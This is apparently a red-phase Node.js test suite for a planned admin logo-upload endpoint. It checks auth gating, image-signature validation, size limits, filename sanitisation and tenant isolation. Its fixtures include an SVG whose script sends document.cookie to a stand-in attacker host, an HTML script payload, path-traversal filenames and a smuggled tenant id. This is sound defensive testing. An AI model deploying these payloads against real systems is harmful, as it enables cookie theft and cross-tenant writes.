'use strict';

// ─────────────────────────────────────────────────────────────────────────────
// C/DL-2 — PHASE 3a RED SUITE — CONTRACTOR LOGO UPLOAD
//
// Phase 0 finding: logo upload is 0% built. The "Brand Color Detection" drop
// zone in the admin Branding page is an in-browser eyedropper — it reads pixels
// off a canvas to suggest colours and persists nothing. There is no endpoint, no
// storage, and no column write. LP §5's "Admin upload (B2, same pipeline as
// email media)" describes work that does not exist.
//
// PROPOSED CONTRACT — this file defines it; the GREEN phase implements it.
//
//   POST /api/admin/branding/logo     multipart/form-data, field name `logo`
//   -> 200 { success: true, logo_url }  and contractor_settings.logo_url written
//
//   COLUMN: logo_url, reused. NOT app_logo_url — that column is the second term
//   of three email fallback chains, and redefining it would change what those
//   emails render. (Ruling: Phase 0 for Phase 3.)
//
//   GATE: requirePermission('branding.manage'), matching the resource.manage
//   write convention and the gate already on PUT /api/admin/settings.
//
//   MIME WHITELIST: PNG, JPEG, WEBP.
//
//   ── SVG IS EXCLUDED, DELIBERATELY, AND MUST STAY EXCLUDED ─────────────────
//   SVG is an XML document that may carry <script>, foreignObject and external
//   entity references. Inside an <img> tag a browser refuses to execute any of
//   it, which is why "SVG logos are fine" is true for the page itself and is the
//   reasoning that will be offered for re-adding it.
//
//   It is not true HERE, because the file does not stay inside an <img>. It is
//   stored at a PUBLIC Backblaze URL, and that URL can be navigated to directly.
//   On direct navigation the browser treats image/svg+xml as a document, in the
//   origin that serves it, and every script in it runs. The contents are
//   attacker-influenced by construction: this endpoint's whole job is to accept
//   a file an admin supplies. That amends LP §4's "PNG/SVG" allowance.
//
//   Anyone reading this before widening the whitelist: the question to answer is
//   not "is it safe in an <img>" but "is it safe when someone opens the B2 URL
//   in a tab". Same for any other markup-bearing type — SVGZ, XML, HTML.
//
//   SIZE: its own multer limit, exported as LOGO_UPLOAD_LIMIT.maxBytes. The
//   campaigns router's shared `upload` instance is 10MB (campaigns.js:18) and
//   reusing it would let a 10MB file into memory before any handler code runs.
//
// NO LIVE BACKBLAZE. @aws-sdk/client-s3 is replaced in require.cache before
// anything that imports it is loaded — the same interception pattern
// signupEmailWhiteLabel.test.js and resendVerificationCode.test.js use for
// `resend`. The stub RECORDS PutObjectCommand inputs rather than discarding
// them, because the object KEY is the subject of the sanitisation tests. B2_*
// env vars are set to inert local values for the same reason: nothing here may
// depend on credentials the test machine does not have.
//
// NO PRODUCTION CONTRACTOR ID LITERALS (house rule) — tenant ids are
// fixture-local.
// ─────────────────────────────────────────────────────────────────────────────

// ── B2 INTERCEPTION — must run before app.js pulls in campaigns.js ────────────

process.env.B2_ENDPOINT            = 'https://s3.test.invalid';
process.env.B2_MEDIA_KEY_ID        = 'test-key-id';
process.env.B2_MEDIA_APPLICATION_KEY = 'test-application-key';
process.env.B2_MEDIA_BUCKET_NAME   = 'roofmiles-test-media';
process.env.B2_PUBLIC_URL_BASE     = 'https://cdn.test.invalid/roofmiles-test-media';

// Every PutObjectCommand input the app sent, in order.
const s3Puts = [];
// Set true to make the next send() reject, exercising the storage-failure path.
let s3ShouldFail = false;

const _s3Path = require.resolve('@aws-sdk/client-s3');
// Mirrors the full symbol set the codebase imports — campaigns.js takes
// S3Client/PutObjectCommand/DeleteObjectCommand, backup.js adds
// ListObjectsV2Command, restore-verify.js adds GetObjectCommand. A partial stub
// would break those modules at require time rather than here, which is the
// silent-failure shape the mock rules warn about.
require.cache[_s3Path] = {
  id: _s3Path,
  filename: _s3Path,
  loaded: true,
  exports: {
    S3Client: class {
      async send(command) {
        if (s3ShouldFail) throw new Error('simulated B2 failure');
        if (command && command.__commandType === 'PutObject') s3Puts.push(command.input);
        return { ETag: '"test-etag"' };
      }
    },
    PutObjectCommand:     class { constructor(input) { this.input = input; this.__commandType = 'PutObject'; } },
    DeleteObjectCommand:  class { constructor(input) { this.input = input; this.__commandType = 'DeleteObject'; } },
    GetObjectCommand:     class { constructor(input) { this.input = input; this.__commandType = 'GetObject'; } },
    ListObjectsV2Command: class { constructor(input) { this.input = input; this.__commandType = 'ListObjectsV2'; } },
  },
};

const { describe, it, before, beforeEach, after } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const { request: _httpRequest } = require('node:http');

const { initTestDb } = require('./setup');
const { createApp } = require('../app');
const { startTestServer, stopTestServer } = require('./helpers');

const LOGO_PATH = '/api/admin/branding/logo';

const TENANT_A_ID = 'tnt-h6zk-internal';
const TENANT_B_ID = 'tnt-p2ls-internal';

const COMPANY_A = 'Alpha Roofing Co';
const COMPANY_B = 'Beta Roofing Co';

// Tenant B's pre-existing logo. Any change to it is a cross-tenant write.
const TENANT_B_LOGO = 'https://cdn.test.invalid/beta/original-logo.png';

// ── REAL IMAGE FIXTURES ───────────────────────────────────────────────────────
// Genuine 1×1 files, not random bytes, so these tests keep working if the GREEN
// phase validates magic bytes as well as the declared MIME type — which it
// reasonably might, since the declared type is client-supplied.
const PNG_1x1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
  'base64'
);
const JPEG_1x1 = Buffer.from(
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwc' +
  'KDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAA' +
  'AAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==',
  'base64'
);
const WEBP_1x1 = Buffer.from(
  'UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA',
  'base64'
);
const SVG_DOC = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">' +
  '<script>fetch("https://attacker.test.invalid/"+document.cookie)</script></svg>',
  'utf8'
);

// ── MULTIPART ENCODER ─────────────────────────────────────────────────────────
// Hand-rolled rather than pulling in a form-data package: this is the only place
// in the suite that needs it, and the Dependency Management Standards forbid a
// new package for a single use case a few lines of Node can cover.
function encodeMultipart(parts) {
  const boundary = '----RoofMilesTestBoundary' + crypto.randomBytes(8).toString('hex');
  const chunks = [];
  for (const part of parts) {
    let head = `--${boundary}\r\nContent-Disposition: form-data; name="${part.name}"`;
    if (part.filename !== undefined) head += `; filename="${part.filename}"`;
    head += '\r\n';
    if (part.contentType) head += `Content-Type: ${part.contentType}\r\n`;
    head += '\r\n';
    chunks.push(Buffer.from(head, 'utf8'), part.data, Buffer.from('\r\n', 'utf8'));
  }
  chunks.push(Buffer.from(`--${boundary}--\r\n`, 'utf8'));
  return { boundary, body: Buffer.concat(chunks) };
}

function httpUpload(port, token, { field = 'logo', filename, contentType, data }) {
  const { boundary, body } = encodeMultipart([{ name: field, filename, contentType, data }]);
  return new Promise((resolve, reject) => {
    const req = _httpRequest({
      hostname: 'localhost', port, path: LOGO_PATH, method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': body.length,
        ...(token ? { Authorization: `Bearer ${token}` } : {}),
      },
    }, res => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const raw = Buffer.concat(chunks).toString();
        let parsed = null;
        try { parsed = raw ? JSON.parse(raw) : null; } catch { parsed = raw; }
        resolve({ status: res.statusCode, body: parsed, raw });
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

describe('C/DL-2 Phase 3a — POST /api/admin/branding/logo', () => {
  let pool, server, port;
  let ownerA, ownerB, readOnlyA;

  before(async () => {
    pool = await initTestDb();
    ({ server, port } = await startTestServer(createApp()));

    const hash = await bcrypt.hash('TestLogo123!', 4);   // rounds=4 for test speed

    for (const [id, name] of [[TENANT_A_ID, COMPANY_A], [TENANT_B_ID, COMPANY_B]]) {
      await pool.query(`INSERT INTO contractors (id, name) VALUES ($1, $2)`, [id, name]);
    }

    const mkMember = async (contractorId, email, tier, permissions) => {
      const { rows } = await pool.query(
        `INSERT INTO team_members (contractor_id, email, password_hash, tier, permissions)
         VALUES ($1, $2, $3, $4, $5) RETURNING id`,
        [contractorId, email, hash, tier, JSON.stringify(permissions)]
      );
      return rows[0].id;
    };

    ownerA = await mkMember(TENANT_A_ID, 'owner@alpha.test.invalid', 'owner', {});
    ownerB = await mkMember(TENANT_B_ID, 'owner@beta.test.invalid',  'owner', {});
    // Holds `branding` (view) but NOT `branding.manage` (write) — the gate probe.
    readOnlyA = await mkMember(TENANT_A_ID, 'viewer@alpha.test.invalid', 'admin', { branding: true });
  });

  after(async () => {
    await stopTestServer(server);
    await pool.end();
  });

  beforeEach(async () => {
    s3Puts.length = 0;
    s3ShouldFail = false;
    await pool.query('DELETE FROM sessions');
    await pool.query('DELETE FROM contractor_settings');
    await pool.query(
      `INSERT INTO contractor_settings (contractor_id, company_name, logo_url)
       VALUES ($1, $2, NULL), ($3, $4, $5)`,
      [TENANT_A_ID, COMPANY_A, TENANT_B_ID, COMPANY_B, TENANT_B_LOGO]
    );
  });

  async function session(contractorId, teamMemberId) {
    const token = crypto.randomBytes(32).toString('hex');
    await pool.query(
      `INSERT INTO sessions (user_id, token, expires_at, role, contractor_id, team_member_id)
       VALUES (NULL, $1, NOW() + INTERVAL '1 hour', 'admin', $2, $3)`,
      [token, contractorId, teamMemberId]
    );
    return token;
  }

  async function logoUrlOf(contractorId) {
    const { rows } = await pool.query(
      `SELECT logo_url FROM contractor_settings WHERE contractor_id = $1`, [contractorId]
    );
    return rows[0] ? rows[0].logo_url : null;
  }

  // The declared bound, read from the router rather than hardcoded here — the
  // convention referrer.js already uses for LANDING_RESOLVE_LIMIT and
  // RESEND_CODE_LIMIT (referrer.js:2794-2800). A test that re-typed the number
  // would fail on every tuning change and prove nothing about the behaviour.
  function limit() {
    const adminRouter = require('../routes/admin/index');
    const l = adminRouter.LOGO_UPLOAD_LIMIT;
    assert.ok(
      l,
      "server/routes/admin/index.js must export LOGO_UPLOAD_LIMIT so the suite reads the endpoint's " +
      'own bound instead of hardcoding it'
    );
    return l;
  }

  // ── 1. THE LIMIT CONTRACT ──────────────────────────────────────────────────

  it('declares its own upload bound, tighter than the campaigns router\'s 10MB', async () => {
    const l = limit();
    assert.ok(Number.isInteger(l.maxBytes) && l.maxBytes > 0, 'LOGO_UPLOAD_LIMIT.maxBytes must be a positive integer');
    assert.ok(
      l.maxBytes < 10 * 1024 * 1024,
      'LOGO_UPLOAD_LIMIT.maxBytes is at or above the campaigns router\'s shared 10MB multer instance — ' +
      'the endpoint is inheriting a bound rather than setting one. A logo is a header image; ' +
      'megabytes of it are a memory-pressure primitive, not a brand asset'
    );
  });

  // ── 2. THE GATE ────────────────────────────────────────────────────────────

  it('a member without branding.manage is refused, and nothing is stored', async () => {
    const token = await session(TENANT_A_ID, readOnlyA);

    const res = await httpUpload(port, token, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.equal(
      res.status, 403,
      `a member holding only 'branding' must not be able to upload a logo, got ${res.status}: ${res.raw}`
    );
    assert.equal(s3Puts.length, 0, 'the refused upload still reached Backblaze');
    assert.equal(await logoUrlOf(TENANT_A_ID), null, 'the refused upload still wrote logo_url');
  });

  it('an unauthenticated caller is refused', async () => {
    const res = await httpUpload(port, null, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });
    assert.equal(res.status, 401, `expected 401 for a tokenless upload, got ${res.status}: ${res.raw}`);
    assert.equal(s3Puts.length, 0, 'the unauthenticated upload still reached Backblaze');
  });

  // ── 3. HAPPY PATH + PERSISTENCE ────────────────────────────────────────────

  it('stores the file and persists the returned URL to the caller\'s logo_url', async () => {
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'alpha-logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.equal(res.status, 200, `logo upload failed: ${res.raw}`);
    assert.ok(res.body && typeof res.body === 'object', `expected a JSON body, got: ${res.raw}`);
    assert.equal(typeof res.body.logo_url, 'string', `the response must return the public URL, got: ${res.raw}`);
    assert.match(res.body.logo_url, /^https?:\/\//, `logo_url must be an absolute URL, got: ${res.body.logo_url}`);

    assert.equal(s3Puts.length, 1, `expected exactly one object stored, got ${s3Puts.length}`);
    assert.ok(s3Puts[0].Body && s3Puts[0].Body.length > 0, 'an empty object was stored');

    // The stored URL and the returned URL must be the same string. Two
    // independently-built URLs is how a logo ends up rendering a 404 for every
    // homeowner while the admin panel shows it fine.
    assert.equal(
      await logoUrlOf(TENANT_A_ID), res.body.logo_url,
      'contractor_settings.logo_url does not match the URL returned to the caller'
    );
  });

  it('accepts PNG, JPEG and WEBP', async () => {
    const cases = [
      ['PNG',  'logo.png',  'image/png',  PNG_1x1],
      ['JPEG', 'logo.jpg',  'image/jpeg', JPEG_1x1],
      ['WEBP', 'logo.webp', 'image/webp', WEBP_1x1],
    ];
    for (const [label, filename, contentType, data] of cases) {
      const token = await session(TENANT_A_ID, ownerA);
      const res = await httpUpload(port, token, { filename, contentType, data });
      assert.equal(res.status, 200, `${label} was rejected: ${res.raw}`);
      assert.equal(typeof res.body.logo_url, 'string', `${label} returned no logo_url: ${res.raw}`);
    }
    assert.equal(s3Puts.length, 3, 'not every accepted type was actually stored');
  });

  it('creates the settings row when the contractor has none', async () => {
    // The first-run path, and the likely one: a brand-new contractor opens
    // Branding and uploads their logo before saving any other field. A bare
    // UPDATE would report success and write nothing.
    await pool.query('DELETE FROM contractor_settings WHERE contractor_id = $1', [TENANT_A_ID]);
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.equal(res.status, 200, `logo upload failed for a contractor with no settings row: ${res.raw}`);
    assert.equal(await logoUrlOf(TENANT_A_ID), res.body.logo_url, 'no settings row was created for the logo');
  });

  it('replaces a previous logo rather than accumulating', async () => {
    const token = await session(TENANT_B_ID, ownerB);
    assert.equal(await logoUrlOf(TENANT_B_ID), TENANT_B_LOGO, 'fixture error: tenant B has no starting logo');

    const res = await httpUpload(port, token, {
      filename: 'new-logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.equal(res.status, 200, `logo upload failed: ${res.raw}`);
    assert.notEqual(await logoUrlOf(TENANT_B_ID), TENANT_B_LOGO, 'the new logo did not replace the old one');
    assert.equal(await logoUrlOf(TENANT_B_ID), res.body.logo_url);
  });

  // ── 4. TYPE REJECTION ──────────────────────────────────────────────────────

  it('rejects SVG', async () => {
    // See the SVG reasoning in this file's header before relaxing this. Short
    // version: the uploaded file is served from a PUBLIC B2 URL that can be
    // navigated to directly, and on direct navigation image/svg+xml is a
    // document whose scripts execute — not an inert image.
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'logo.svg', contentType: 'image/svg+xml', data: SVG_DOC,
    });

    assert.equal(
      res.status, 400,
      `SVG must be refused with a 400, got ${res.status}: ${res.raw}`
    );
    assert.equal(s3Puts.length, 0, 'the rejected SVG was uploaded to Backblaze anyway');
    assert.equal(await logoUrlOf(TENANT_A_ID), null, 'the rejected SVG still wrote logo_url');
  });

  it('an SVG cannot smuggle itself in behind a lying content type', async () => {
    // STRENGTHENED in Phase 3b. This test previously accepted EITHER outcome —
    // outright rejection, or acceptance with a key extension derived from the
    // validated type — because either left the stored object inert. Magic-byte
    // validation now makes rejection the actual contract, so the weaker
    // either/or form is gone and 400 is asserted directly.
    //
    // The declared MIME type is entirely client-supplied, so the whitelist alone
    // is a suggestion rather than a control: these are SVG bytes wearing an
    // image/png label. The bytes must be checked against the label.
    //
    // The extension-derivation this replaces has NOT been removed — it still runs,
    // and it is what made the mislabelled file harmless rather than exploitable.
    // The signature check is the stronger statement layered on top: nothing that
    // is not a real image reaches the bucket at all.
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'logo.svg', contentType: 'image/png', data: SVG_DOC,
    });

    // NON-VACUITY: an unmounted route answers 404, which is also a 4xx. Without
    // this, the assertion below would pass against an endpoint that does not
    // exist. Same guard requirePermission.test.js puts on its synthetic routes.
    assert.notEqual(
      res.status, 404,
      'POST /api/admin/branding/logo is not mounted — this test is asserting nothing'
    );
    assert.equal(
      res.status, 400,
      `SVG bytes declared image/png must be refused on their signature, got ${res.status}: ${res.raw}`
    );
    assert.equal(s3Puts.length, 0, 'the mislabelled file was stored in the bucket anyway');
    assert.equal(await logoUrlOf(TENANT_A_ID), null, 'the mislabelled file still wrote logo_url');
  });

  it('rejects a truncated or garbage buffer declared as an image', async () => {
    // The general form of the test above, and the one that makes "the bucket
    // contains only real images" a property rather than a hope. None of these
    // are attacks — a half-finished upload and a mis-picked file are ordinary —
    // but each would otherwise sit at a public, permanent URL served as an image
    // that no client can decode.
    //
    // NON-VACUITY: the PNG/JPEG/WEBP acceptance test above proves the endpoint
    // does accept real images, so these rejections cannot be an endpoint that
    // refuses everything.
    const cases = [
      ['random bytes',      Buffer.from([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c])],
      ['plain text',        Buffer.from('this is not an image, it is a sentence about one')],
      ['truncated PNG',     PNG_1x1.subarray(0, 4)],
      ['empty file',        Buffer.alloc(0)],
      ['PNG header only after a byte of drift', Buffer.concat([Buffer.from([0x00]), PNG_1x1])],
    ];

    for (const [label, data] of cases) {
      s3Puts.length = 0;
      const token = await session(TENANT_A_ID, ownerA);
      const res = await httpUpload(port, token, {
        filename: 'logo.png', contentType: 'image/png', data,
      });

      assert.notEqual(res.status, 404, 'POST /api/admin/branding/logo is not mounted');
      assert.ok(
        res.status >= 400 && res.status < 500,
        `${label}: expected a client error, got ${res.status}: ${res.raw}`
      );
      assert.equal(s3Puts.length, 0, `${label}: stored in the bucket despite not being an image`);
      assert.equal(await logoUrlOf(TENANT_A_ID), null, `${label}: wrote logo_url despite not being an image`);
    }
  });

  it('rejects a real image whose declared type is the wrong one of the three', async () => {
    // Not a smuggling attempt — a genuine PNG labelled image/jpeg. Both types are
    // whitelisted, so a whitelist-only check waves it through and the object is
    // then stored, and served, under a content type it is not. The signature must
    // agree with the LABEL, not merely be one of the accepted formats.
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'logo.jpg', contentType: 'image/jpeg', data: PNG_1x1,
    });

    assert.notEqual(res.status, 404, 'POST /api/admin/branding/logo is not mounted');
    assert.equal(
      res.status, 400,
      `PNG bytes declared image/jpeg must be refused, got ${res.status}: ${res.raw}`
    );
    assert.equal(s3Puts.length, 0, 'the mislabelled image was stored anyway');
  });

  it('rejects a non-image type outright', async () => {
    // Guards the whitelist against being a blocklist of SVG alone.
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'payload.html', contentType: 'text/html', data: Buffer.from('<script>alert(1)</script>'),
    });

    assert.equal(res.status, 400, `text/html must be refused, got ${res.status}: ${res.raw}`);
    assert.equal(s3Puts.length, 0, 'the rejected file was uploaded anyway');
  });

  it('rejects a request carrying no file', async () => {
    const token = await session(TENANT_A_ID, ownerA);
    const res = await httpUpload(port, token, {
      field: 'not_the_logo_field', filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });
    // NON-VACUITY: an unmounted route answers 404, which is a 4xx. Without this,
    // the assertion below passes for a route that does not exist.
    assert.notEqual(
      res.status, 404,
      'POST /api/admin/branding/logo is not mounted — this test is asserting nothing'
    );
    assert.ok(
      res.status >= 400 && res.status < 500,
      `a request with no \`logo\` part must be a client error, got ${res.status}: ${res.raw}`
    );
    assert.equal(s3Puts.length, 0, 'something was stored despite no logo part being present');
  });

  // ── 5. SIZE ────────────────────────────────────────────────────────────────

  it('rejects a file over its own limit, well under the campaigns router\'s 10MB', async () => {
    // NON-VACUITY is the point of the pairing with the test below: this one
    // alone would pass against an endpoint that rejected everything.
    const l = limit();
    const token = await session(TENANT_A_ID, ownerA);

    // A real PNG padded past the bound. Padding after IEND keeps the magic bytes
    // valid, so this stays an oversize PNG rather than becoming an unrecognised
    // blob that could be refused for the wrong reason.
    const oversize = Buffer.concat([PNG_1x1, Buffer.alloc(l.maxBytes + 1 - PNG_1x1.length, 0)]);
    assert.ok(oversize.length > l.maxBytes, 'fixture error: the oversize payload is not oversize');

    const res = await httpUpload(port, token, {
      filename: 'huge.png', contentType: 'image/png', data: oversize,
    });

    assert.ok(
      res.status >= 400 && res.status < 500,
      `an oversize upload must be a client error (400 or 413), got ${res.status}: ${res.raw}. ` +
      'A 500 here means multer\'s LIMIT_FILE_SIZE reached the generic express error handler ' +
      'unhandled (errorLogger.js:172), which also files it as a server fault'
    );
    assert.equal(s3Puts.length, 0, 'the oversize file was uploaded to Backblaze anyway');
    assert.equal(await logoUrlOf(TENANT_A_ID), null, 'the oversize file still wrote logo_url');
  });

  it('accepts a file just under its limit', async () => {
    // The over-reach guard for the test above.
    const l = limit();
    const token = await session(TENANT_A_ID, ownerA);

    const justUnder = Buffer.concat([PNG_1x1, Buffer.alloc(l.maxBytes - 1 - PNG_1x1.length, 0)]);
    assert.ok(justUnder.length < l.maxBytes, 'fixture error: the payload is not under the bound');

    const res = await httpUpload(port, token, {
      filename: 'big-but-legal.png', contentType: 'image/png', data: justUnder,
    });

    assert.equal(res.status, 200, `a file inside the declared bound was rejected: ${res.raw}`);
  });

  // ── 6. FILENAME SANITISATION ───────────────────────────────────────────────

  it('a hostile filename cannot escape its key prefix', async () => {
    // The object key is built from a filename the admin controls. Left raw, a
    // traversal segment writes outside this contractor's prefix — over another
    // contractor's logo, or over a backup path in the same bucket. campaigns.js
    // already sanitises for exactly this reason (campaigns.js:2193); this pins
    // the same property here rather than trusting it to be copied.
    //
    // Asserted as PROPERTIES of the key rather than against a literal prefix
    // string, so the GREEN phase can choose its own layout. The decisive one is
    // the last: a benign and a hostile filename must land under the same prefix.
    const token = await session(TENANT_A_ID, ownerA);

    const benign = await httpUpload(port, token, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });
    assert.equal(benign.status, 200, `the benign upload failed, so there is no baseline to compare: ${benign.raw}`);

    const hostileNames = [
      '../../../../evil.png',
      '..\\..\\..\\evil.png',
      '/etc/cron.d/evil.png',
      `../${TENANT_B_ID}/logo.png`,
    ];

    for (const filename of hostileNames) {
      s3Puts.length = 0;
      const res = await httpUpload(port, token, { filename, contentType: 'image/png', data: PNG_1x1 });

      // A clean rejection is an acceptable answer; silent traversal is not.
      if (res.status !== 200) {
        assert.ok(
          res.status >= 400 && res.status < 500,
          `${filename}: expected acceptance-with-sanitisation or a client error, got ${res.status}: ${res.raw}`
        );
        assert.equal(s3Puts.length, 0, `${filename}: rejected but stored anyway`);
        continue;
      }

      assert.equal(s3Puts.length, 1, `${filename}: 200 with nothing stored — nothing to assert on`);
      const key = s3Puts[0].Key;

      assert.equal(key.includes('..'), false, `${filename}: traversal survived into the key: ${key}`);
      assert.equal(key.includes('\\'), false, `${filename}: a backslash survived into the key: ${key}`);
      assert.equal(key.startsWith('/'), false, `${filename}: the key is absolute: ${key}`);
      assert.equal(
        key.includes(TENANT_B_ID), false,
        `${filename}: the key reaches into another contractor's namespace: ${key}`
      );

      // THE DECISIVE ASSERTION. Everything up to the final path segment must be
      // byte-identical to the benign upload's prefix — which is what "cannot
      // escape its key prefix" actually means.
      const prefixOf = s => s.slice(0, s.lastIndexOf('/') + 1);
      const benignPrefix = prefixOf(benign.body.logo_url);
      assert.equal(
        prefixOf(res.body.logo_url), benignPrefix,
        `${filename}: landed under a different prefix than a benign filename ` +
        `(${prefixOf(res.body.logo_url)} vs ${benignPrefix})`
      );
    }
  });

  it('the object key is namespaced to the calling contractor', async () => {
    const token = await session(TENANT_A_ID, ownerA);
    const res = await httpUpload(port, token, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.equal(res.status, 200, `logo upload failed: ${res.raw}`);
    assert.equal(s3Puts.length, 1, 'nothing was stored');
    assert.ok(
      s3Puts[0].Key.includes(TENANT_A_ID),
      `the object key does not carry the calling contractor's id (${s3Puts[0].Key}) — one flat ` +
      'namespace means one contractor\'s upload can collide with another\'s'
    );
  });

  // ── 7. TENANCY ─────────────────────────────────────────────────────────────

  it('the upload writes only the calling contractor\'s row', async () => {
    // GUARD-PROOF SITE: the write must carry a `WHERE contractor_id = $1` (or an
    // ON CONFLICT keyed on it) taking the id from verifyAdminSession — never from
    // the request body, a query param, or the filename. It is the same seam
    // loadContractorBranding names at referrer.js:211-214: one function, one
    // predicate, so a call site cannot forget it. A logo is the single most
    // visible brand asset there is; writing it to the wrong row puts one
    // roofer's mark on another roofer's homeowner-facing page.
    const token = await session(TENANT_A_ID, ownerA);

    const res = await httpUpload(port, token, {
      filename: 'alpha-logo.png', contentType: 'image/png', data: PNG_1x1,
    });
    assert.equal(res.status, 200, `logo upload failed: ${res.raw}`);

    // NON-VACUITY: tenant A must actually have been written before "tenant B
    // untouched" carries information — a no-op endpoint leaves both untouched.
    assert.equal(
      await logoUrlOf(TENANT_A_ID), res.body.logo_url,
      "tenant A's own row was not written — nothing is proven about tenant B"
    );

    assert.equal(
      await logoUrlOf(TENANT_B_ID), TENANT_B_LOGO,
      "the upload changed another contractor's logo_url"
    );
  });

  it('a request cannot name a contractor other than its session\'s', async () => {
    // The body is multipart, so a hostile caller can add fields alongside the
    // file. Any of these being read instead of the session id is the classic
    // client-supplied-tenant bug the tenant-resolution rebuild removed
    // everywhere else.
    const token = await session(TENANT_A_ID, ownerA);
    const { boundary, body } = encodeMultipart([
      { name: 'contractor_id',  data: Buffer.from(TENANT_B_ID) },
      { name: 'contractorId',   data: Buffer.from(TENANT_B_ID) },
      { name: 'logo', filename: 'logo.png', contentType: 'image/png', data: PNG_1x1 },
    ]);

    const res = await new Promise((resolve, reject) => {
      const req = _httpRequest({
        hostname: 'localhost', port, path: LOGO_PATH, method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': body.length,
          Authorization: `Bearer ${token}`,
        },
      }, r => {
        const chunks = [];
        r.on('data', c => chunks.push(c));
        r.on('end', () => {
          const raw = Buffer.concat(chunks).toString();
          let parsed = null;
          try { parsed = raw ? JSON.parse(raw) : null; } catch { parsed = raw; }
          resolve({ status: r.statusCode, body: parsed, raw });
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });

    assert.equal(res.status, 200, `the hostile-payload upload should succeed and be ignored: ${res.raw}`);
    assert.equal(
      await logoUrlOf(TENANT_A_ID), res.body.logo_url,
      "the session's own contractor was not written"
    );
    assert.equal(
      await logoUrlOf(TENANT_B_ID), TENANT_B_LOGO,
      'a client-supplied contractor id redirected the write to another tenant'
    );
  });

  // ── 8. STORAGE FAILURE ─────────────────────────────────────────────────────

  it('a Backblaze failure does not leave a URL pointing at nothing', async () => {
    // Write-order requirement: store first, persist second. Persisting the URL
    // before the object exists leaves every surface rendering a broken image
    // with no error anywhere, and the admin sees a successful save.
    const token = await session(TENANT_A_ID, ownerA);

    // ── NON-VACUITY CONTROL ──────────────────────────────────────────────────
    // Every assertion below is an absence — not 200, no URL persisted, no error
    // text forwarded — and an unmounted route satisfies all three. So prove the
    // endpoint works FIRST, with storage healthy, then break storage and repeat.
    const control = await httpUpload(port, token, {
      filename: 'control.png', contentType: 'image/png', data: PNG_1x1,
    });
    assert.equal(
      control.status, 200,
      `the endpoint does not succeed even with storage healthy (${control.status}) — ` +
      `the storage-failure assertions below would prove nothing: ${control.raw}`
    );

    // Reset to the pre-upload state so the failure leg starts from a clean row;
    // otherwise the control's own URL would satisfy the "nothing persisted" check.
    await pool.query('UPDATE contractor_settings SET logo_url = NULL WHERE contractor_id = $1', [TENANT_A_ID]);
    s3Puts.length = 0;
    s3ShouldFail = true;

    const res = await httpUpload(port, token, {
      filename: 'logo.png', contentType: 'image/png', data: PNG_1x1,
    });

    assert.notEqual(res.status, 200, `a failed storage write reported success: ${res.raw}`);
    assert.equal(
      await logoUrlOf(TENANT_A_ID), null,
      'logo_url was persisted even though the object was never stored'
    );
    assert.equal(
      res.raw.includes('simulated B2 failure'), false,
      'the storage error text was forwarded to the client (Security Standards: no err.message in 500s)'
    );
  });
});
